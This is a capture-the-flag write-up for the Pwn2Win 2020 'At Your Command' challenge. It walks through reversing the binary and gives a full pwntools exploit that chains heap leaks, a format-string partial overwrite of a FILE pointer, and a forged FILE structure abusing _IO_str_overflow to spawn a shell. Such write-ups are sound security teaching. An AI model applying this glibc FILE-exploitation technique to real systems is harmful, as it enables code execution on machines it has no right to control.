+++
title = "Pwn2Win 2020 At Your Command Writeup"
date = "2020-05-31"
+++

We had a great time playing Pwn2Win CTF held this weekend. I spent most of my time in solving the challenge **At Your Command**.

## TL;DR OF THE CHALLENGE BINARY

The binary is a standard CTF-style `x86 64-bit Dynamically Linked` executable.
We've been given the binary as well as glibc 2.27 to start with.

Here's the output of *checksec*.

```sh
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL

```

Without any further delay , let's get into reversing the binary.

## REVERSING

Initially the binary takes a **name** string of size 12 bytes as input.

```c
 printf("Your name: ", a2);
 v6 = read(0, buf, 12uLL);
```

And then we are directed to a standard Menu-Driven program.

```c
int command_menu()
{
  puts(&byte_5555555555FA);
  puts("Choose an option:");
  puts("1. Include command");
  puts("2. Review command");
  puts("3. Delete command");
  puts("4. List commands");
  puts("5. Send commands");
  return printf("> ");
}
```

Let's see what each functionality has to do.

* **Include Command** aka ADD :
    1. Can Allocate 10 chunks at max.
    2. Stores heap pointers in an array located in stack.
    3. Calls malloc of size **0x188**.
    4. Asks for **Priority** which is a *long long integer* and places it in the first 8 bytes of the malloc'd chunk.
    5. Then reads input of size **0x170** from the next memory location in heap after Priority.


```c
  signed int i; // [rsp+14h] [rbp-1Ch]
  ssize_t v3; // [rsp+18h] [rbp-18h]

  for ( i = 0; ; ++i )
  {
    if ( i > 9 )
      return puts("[INFO] The authorized limit has been reached!");
    if ( !*(8LL * i + a1) )
      break;
  }
  *(8LL * i + a1) = malloc(0x188uLL);
  printf("Priority: ");
  **(8LL * i + a1) = get_int_0();
  printf("Command: ");
  v3 = read(0, (*(8LL * i + a1) + 8LL), 0x170uLL);
  if ( v3 )
  {
    if ( *(*(8LL * i + a1) + v3 - 1 + 8) == 10 )
      *(*(8LL * i + a1) + v3 - 1 + 8) = 0;
  }
  return printf("The command has been included at index %d\n", i);
```

* **View** 
    1. Views the chunk at the requested index.


```c

  __int64 v1; // rax
  int v3; // [rsp+1Ch] [rbp-4h]

  printf("Command index: ");
  LODWORD(v1) = get_int();
  v3 = v1;
  if ( v1 >= 0 && v1 <= 9 )
  {
    v1 = *(8LL * v1 + a1);
    if ( v1 )
    {
      puts(&byte_5555555555FA);
      LODWORD(v1) = print_name_0(*(8LL * v3 + a1));
    }
  }
```

* **Delete** 
    1. It frees the chunk at the requested index and also **NULLS** out the pointer on stack.
    2. Hence no UAF.

```c
  __int64 v1; // rax
  int v3; // [rsp+1Ch] [rbp-4h]

  printf("Command index: ");
  LODWORD(v1) = get_int();
  v3 = v1;
  if ( v1 >= 0 && v1 <= 9 )
  {
    v1 = *(8LL * v1 + a1);
    if ( v1 )
    {
      free(*(8LL * v3 + a1));
      *(8LL * v3 + a1) = 0LL;
      LODWORD(v1) = puts("The command has been successfully deleted");
    }
  }
  return v1;

```

* **List** 
    1. Prints out content of all existing chunks.


```c
  __int64 v1; // rax
  signed int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; i <= 9; ++i )
  {
    v1 = *(8LL * i + a1);
    if ( v1 )
    {
      puts(&byte_5555555555FA);
      printf("Index %d\n", i);
      LODWORD(v1) = print_name_0(*(8LL * i + a1));
    }
  }
  return v1;

```

We can return from the Menu driven code by sending a **5** and then something interesting happens.

```c
  v3 = time(0LL);
  snprintf(filename, 0x2DuLL, "/commands/%ld", v3);
  stream = fopen(filename, modes);
```

The binary opens a file with the name as return value of **time(0)** which is pretty cool.

Then it calls another function which does some operations on the file.

Here , the binary asks for yet another input of a long long integer but there's a twist here.

Let's see what that is.

```sh
    0000555555555299                 call    get_int_0
    000055555555529E                 cdqe
```

There's a **cdqe** instruction which will make our long long integer into 4 bytes.

So if we think of giving a valid address there , its not something u want to do.

Moving on , we have calls to fprintf to copy all our chunks' data into the file that was opened previously.

**NOTICE** We should remember that *fprintf* internally calls malloc again.
{: .notice}

```c
fprintf(*stream, "Id: %lld\n", v2, stream);
  for ( i = 0; i <= 9; ++i )
  {
    if ( *(8LL * i + a1) )
      fprintf(*v4, "%lld:%s\n", **(8LL * i + a1), *(8LL * i + a1) + 8LL);
  }
```

Just after that , we have a vulnerable snprintf coming through.

```c
snprintf(&src,0xc,buf);
```

Reminding you that **buf** was the initial name that we entered on bss and **src** is a local variable located at **[rbp-0x30]**.

As there is no format specifier , our buf acts as the format specifier and thus we have the infamous **Format String Vulnerability**.

We copy our 12 bytes of buf to src.

```c
   *&s = " .rM";
   v8=0;
   strcat(&s,&src);
   printf("You command %s\n",&s);
```

Here **s** is an *char* array located at **[rbp-0x20]**.

**strcat** will concatenate *s* with *src* but here we will not run into any buffer overrruns because even after concatenating, we will not reach out of bounds.

After all this is done ,**fclose** is called on the stream in the end.

```c
fclose(stream);
```

Now that we have reversed the binary , let us start writing exploit.

## EXPLOIT DEVELOPMENT

### Setting up the Local Environment

For those of you who dont want another `/commands` folder in your root directory can simply edit the binary using ghex just the way it is done for preloading Libc.

We edit the string **/commands/%lld** in ghex with **./ommands/%lld** and create a folder *ommands* in the PWD.

To make sure that a file with name **./ommands/time(0)** exists in that directory , we can use the **ctypes** python library and get the value of **time(0)** which we can pass to os.system and touch a file with that name to create it.

Here's the script to get things started with all wrapper functions.

```py
from pwn import *
import sys
import ctypes
from ctypes import *
import os

context.arch="amd64"

def setup_env():
    libc = ctypes.cdll.LoadLibrary("./libc.so.6")
    LIBC = ELF("./libc.so.6")
    time = libc.time(0)
    os.system("touch ./ommands/{}".format(time))

if(len(sys.argv)>1):
    io=remote('command.pwn2.win',1337)
    context.noptrace=True
else:
    io=process("./command",env = {"LD_PRELOAD" : "./libc.so.6"})
    setup_env()


def send_name(name):
    io.sendafter('Your name: ',name)

def add(priority,command):
    io.sendlineafter('> ','1')
    io.sendlineafter('Priority: ',str(priority))
    io.sendafter('Command: ',command)

def view(idx):
    io.sendlineafter('> ','2')
    io.sendlineafter('index: ',str(idx))

def free(idx):
    io.sendlineafter('> ','3')
    io.sendlineafter('index: ',str(idx))

def list():
    io.sendlineafter('> ','4')

def ret():
    io.sendlineafter('> ','5')

def send_commands(ID):
    io.sendlineafter('which rbs?\n',str(ID))
    io.recvuntil('You command Mr. ')


if __name__=="__main__":
    
```

### MEMORY LEAKS

We have malloc and we have tcache. That's enough to get libc right? But how?

So here's the idea , we allocate 8 chunks , free 8 chunks , now 7 of them go into tcache and one remaining chunk goes into unsorted bin.

Now we can add back 7 chunks and consume all tcache , and adding one more will give us our unsorted bin chunk which we can read.

Reminding you that we have first 8 bytes on any malloc'd chunk exclusively reserved for **Priority**.

In order to get our beloved libc leak , we first need to make sure that all 8 bytes of **Priority** are occupied. This can be achieved by simply giving a size larger than 4 bytes which would trick **cdqe** into thinking it as negetive and thus filling up all 8 bytes of Priority.

Wait , what about Heap??

If we send two different chunks to unsorted bin , we can get unsorted bin chunks, one of whose bk pointer is heap.

Nice , so let's script it a bit.

```py
   if __name__=="__main__":
    send_name('aaaaa')

    #Initially we allocate 10 chunks
    for i in xrange(10): 
        add(123,'a')
    
    #Then we start filling tcache from 3rd chunk
    for i in xrange(3,10):
        free(i)
    #These two chunks go into unsorted bin chunks without merging.
    free(0)
    free(2)
    #Now we consume all 7 tcache chunks that we first filled
    for i in xrange(7):
        add(123123,'fill_tcache')
    #Finally , we get back our unsorted bin chunks whose bk pointers will give heap and libc.
    add('123456789123','a')
    add('123456789123','a')
    view(8)
    #Libc
    io.recvuntil('Command: ')
    libc_base = u64(io.recv(6) + '\x00'*2) - 0x3ebc61
    log.info("libc_base = " + hex(libc_base))
    one_gadget = libc_base + 0x10a38c
    #Heap
    view(9)
    io.recvuntil('Command: ')
    heap_base = u64(io.recv(6) + '\x00'*2) - 0x561
    log.info("heap_base = " + hex(heap_base))
    gdb.attach(io)
   
```

Now that we have the necessary leaks , let us return from our Menu Driven subroutine and execute the rest of the code.

```py
    ret()
```

From here , we need help of our old friend , yes you guessed it right , **gdb**.

This is how the file structure created by fopen looks like.

```sh
gdb-peda$ 
0x555555758070:	0x00000000fbad2c84	0x00005555557582a0 
0x555555758080:	0x00005555557582a0	0x00005555557582a0
0x555555758090:	0x00005555557582a0	0x0000555555758439
0x5555557580a0:	0x00005555557592a0	0x00005555557582a0
0x5555557580b0:	0x00005555557592a0	0x0000000000000000
0x5555557580c0:	0x0000000000000000	0x0000000000000000
0x5555557580d0:	0x0000000000000000	0x00007ffff7dd0680
0x5555557580e0:	0x0000000000000003	0x0000000000000000
0x5555557580f0:	0x0000000000000000	0x0000555555758150
0x555555758100:	0xffffffffffffffff	0x0000000000000000
0x555555758110:	0x0000555555758160	0x0000000000000000
0x555555758120:	0x0000000000000000	0x0000000000000000
0x555555758130:	0x00000000ffffffff	0x0000000000000000
0x555555758140:	0x0000000000000000	0x00007ffff7dcc2a0
0x555555758150:	0x0000000000000000	0x0000000000000000
0x555555758160:	0x0000000000000000	0x0000000000000000
0x555555758170:	0x0000000000000000	0x0000000000000000
0x555555758180:	0x0000000000000000	0x0000000000000000
0x555555758190:	0x0000000000000000	0x0000000000000000
0x5555557581a0:	0x0000000000000000	0x0000000000000000
0x5555557581b0:	0x0000000000000000	0x0000000000000000
0x5555557581c0:	0x0000000000000000	0x0000000000000000
0x5555557581d0:	0x0000000000000000	0x0000000000000000
0x5555557581e0:	0x0000000000000000	0x0000000000000000
0x5555557581f0:	0x0000000000000000	0x0000000000000000
0x555555758200:	0x0000000000000000	0x0000000000000000
0x555555758210:	0x0000000000000000	0x0000000000000000
0x555555758220:	0x0000000000000000	0x0000000000000000
0x555555758230:	0x0000000000000000	0x0000000000000000
0x555555758240:	0x0000000000000000	0x0000000000000000
0x555555758250:	0x0000000000000000	0x0000000000000000
0x555555758260:	0x0000000000000000	0x0000000000000000
0x555555758270:	0x0000000000000000	0x0000000000000000
0x555555758280:	0x0000000000000000	0x0000000000000000
0x555555758290:	0x00007ffff7dcbd60 -> vtable	0x0000000000001011
0x5555557582a0:	0x37343132203a6449	0x2d0a393935313834 -> all of user data

```

Also , let us analyze stack at the instance of triggering the format string bug.

```sh

0000| 0x7fffffffec90 --> 0x7fffffffecf0 --> 0x555555758070 --> 0xfbad2c84 -> Interestingly , the pointer to file structure is also stored here. 
0008| 0x7fffffffec98 --> 0x7fffffffed00 --> 0x0 
0016| 0x7fffffffeca0 --> 0xa55756080 
0024| 0x7fffffffeca8 --> 0x7ffff7ff 
0032| 0x7fffffffecb0 --> 0x666564636261 ('abcdef') -> our input buf
0040| 0x7fffffffecb8 --> 0x0 
0048| 0x7fffffffecc0 --> 0x202e724d ('Mr. ')
0056| 0x7fffffffecc8 --> 0x0 
0064| 0x7fffffffecd0 --> 0x7fff00000000 
0072| 0x7fffffffecd8 --> 0x2c18ea94720bb00 
0080| 0x7fffffffece0 --> 0x7fffffffed60 --> 0x555555555530 (push   r15)
0088| 0x7fffffffece8 --> 0x555555555500 (mov    rax,QWORD PTR [rbp-0x70])
0096| 0x7fffffffecf0 --> 0x555555758070 --> 0xfbad2c84
0104| 0x7fffffffecf8 --> 0x6 
0112| 0x7fffffffed00 --> 0x0 
0120| 0x7fffffffed08 --> 0x0 
0128| 0x7fffffffed10 --> 0x0 
0136| 0x7fffffffed18 --> 0x0 
0144| 0x7fffffffed20 --> 0x0 
0152| 0x7fffffffed28 --> 0x0 
0160| 0x7fffffffed30 --> 0x0 
0168| 0x7fffffffed38 --> 0x555555757d50 --> 0xffffffffbe991a83 
0176| 0x7fffffffed40 --> 0x555555757ee0 --> 0x3039 ('90')
0184| 0x7fffffffed48 --> 0x0 
0192| 0x7fffffffed50 --> 0x7fffffffee40 --> 0x1 
0208| 0x7fffffffed60 --> 0x555555555530 (push   r15)
0216| 0x7fffffffed68 --> 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax) -> The good old libc_start_main

```
We observe that the very first offset of stack at the instance of format string being triggered is **pointer to the file structure**.

So, we can directly use our old friend **%n** to completely fake the file structure.
{: .notice}

We can fake the file pointer to any of our allocated chunks.

It's time to craft our format string payload.

```py
payload = '%32896c' + '%4$hn'

```

We send the payload instead of name in the very beginning of our exploit.

And now , after triggering the format string , we overwrite the file structure with our fake structure.

```sh
0000| 0x7fffffffec90 --> 0x7fffffffecf0 --> 0x555555758200 --> 0xfbad2c84 -> Before triggering format string
0008| 0x7fffffffec98 --> 0x7fffffffed00 --> 0x555555758070 --> 0x1e0f3 
0016| 0x7fffffffeca0 --> 0xa55756080 
0024| 0x7fffffffeca8 --> 0x4d1 
0032| 0x7fffffffecb0 --> 0x0 

-------x-----------x---------x----------x----------x

0000| 0x7fffffffec90 --> 0x7fffffffecf0 --> 0x555555758080 --> 0x656863 ('che') -> We overwrote it yaaay!
0008| 0x7fffffffec98 --> 0x7fffffffed00 --> 0x555555758070 --> 0x1e0f3
0016| 0x7fffffffeca0 --> 0xa55756080
0024| 0x7fffffffeca8 --> 0x4d1

```

We fake the file struture somewhere close to our original file structure as we dont have leaks initially. We are doing this because the last 3 nibbles of any memory region are not effected by **ASLR** and hence we overwrite only the last 2 bytes of our original file structure to point it to our fake file structure.

Let us craft our file structure.

Here we are going to bypass vtable check by corrupting the value of vtable inorder to trigger *_IO_str_overflow*.

Before crafting our file structure , let us try to understand how we trigger control flow with *IO_str_overflow*.

```c
_IO_str_overflow (_IO_FILE *fp, int c)
{
  int flush_only = c == EOF;
  _IO_size_t pos;
  if (fp->_flags & _IO_NO_WRITES)
      return flush_only ? 0 : EOF;
  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
    {
      fp->_flags |= _IO_CURRENTLY_PUTTING;
      fp->_IO_write_ptr = fp->_IO_read_ptr;
      fp->_IO_read_ptr = fp->_IO_read_end;
    }
  pos = fp->_IO_write_ptr - fp->_IO_write_base;
  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
    {
      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
        return EOF;
      else
    {
      char *new_buf;
      char *old_buf = fp->_IO_buf_base;
      size_t old_blen = _IO_blen (fp);
      _IO_size_t new_size = 2 * old_blen + 100;
      if (new_size < old_blen)
        return EOF;
      new_buf = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);

```
By corrupting certain pointers of file structure , we can redirect the control flow to call 

```c
    new_buf = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
```

It can be observed from the source code that ->

```c
    _IO_size_t new_size = 2 * old_blen + 100;
```
Where *old_blen* is defined as ->

```c

old_blen = fp->_IO_buf_end - fp->_IO_buf_base

```
So , if we set *IO_buf_base* to 0 , and *_IO_buf_end* to *(binsh_ptr-100)/2* ,then *new_size* which is the first argument of *IO_strfile* function will be pointer to **/bin/sh**.

But wait , we have one more restriction before getting control flow.

```c
  pos = fp->_IO_write_ptr - fp->_IO_write_base;
  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
  {
    // enter target condition
  }
```
*flush_only* is 0, so we want *pos >= _IO_blen(fp)*. 

This can be achieved by setting *_IO_write_ptr = (binsh - 100)/2* and *_IO_write_base = 0*.

Let's nicely recall what all need to go ahead now

1. set *IO_buf_base* to 0.
2. set *IO_buf_end* to *(binsh-100)/2*
3. set *IO_write_ptr* to *(binsh-100)/2*
4. set *IO_write_base* to 0
5. set vtable to *IO_str_overflow-0x10*

```py
    free(0) # We free this chunk and allocate it back as it is closest to our original file structure

    binsh = libc_base + LIBC.search('/bin/sh\x00').next()  
    system = libc_base + LIBC.symbols['system']
    io_str_overflow_ptr_addr = libc_base + LIBC.symbols['_IO_file_jumps'] + 0xd8

    #Fake File Structure
    fake_vtable = io_str_overflow_ptr_addr - 2*8
    fake_file_str = p64(0xfbad1800) + p64(heap_base+0x1430)*3
    fake_file_str += p64(0)
    fake_file_str += p64((binsh-100)/2+1)  #IO_write_ptr
    fake_file_str += p64(heap_base + 0x1430)
    fake_file_str += p64(0) #IO_buf_base
    fake_file_str += p64((binsh-100)/2)     #IO_buf_end
    fake_file_str += p64(0)*4
    fake_file_str += p64(libc_base + LIBC.symbols['_IO_2_1_stderr_'])
    fake_file_str += p64(3)
    fake_file_str += p64(0)*2
    fake_file_str += p64(heap_base + 0x12e0) 
    fake_file_str += p64(0xffffffffffffffff)
    fake_file_str += p64(0)
    fake_file_str += p64(heap_base + 0x12f0)
    fake_file_str += p64(2) + p64(3) + p64(0)
    fake_file_str += p64(0x00000000ffffffff)
    fake_file_str += p64(0xffffffffffffffff) + p64(0)
    fake_file_str += p64(fake_vtable)
    fake_file_str += p64(system)
    #Add the fake file structure
    add(123,'f'*8 + fake_file_str)
    gdb.attach(io)
    ret()
    send_commands(1233)
    io.interactive()

```

Boom , get shell!!

## CONCLUSION

I would like to thank the challenge author [n0ps13d](https://twitter.com/n0ps13d) for creating such a beautiful challenge.
Shout out to team [Pwn2Win](https://twitter.com/Pwn2Win) for conducting the CTF.

## Resources

1. [Dhaval Kapil's Blog](https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/)
2. [File Exploit offsets By sherlock_](https://github.com/vigneshsrao/File-xploit/blob/master/FilePointer.py)

Here' the [link](https://gist.github.com/PwnVerse/fd225be6ec55144e9b32169ffbe9bc9a) to final exploit


